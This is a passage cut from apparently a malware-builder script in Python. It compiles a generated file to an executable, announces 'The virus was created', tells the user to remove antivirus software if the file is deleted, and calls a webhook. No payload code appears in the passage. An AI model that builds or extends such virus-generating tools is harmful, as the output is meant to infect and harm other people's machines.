            else:
                ConvertToExe(file_python, path_destination, name_file, icon_path)
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} The python file created previously was deleted, please remove your anti virus and try again.")

    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} The virus was created, it is found in: {white + path_destination_relative}")
    try: os.startfile(path_destination)
    except: pass
    try: SendWebhook(webhook)
    except: pass
    time.sleep(20)
    Reset()
except Exception as e: 
    Error(e)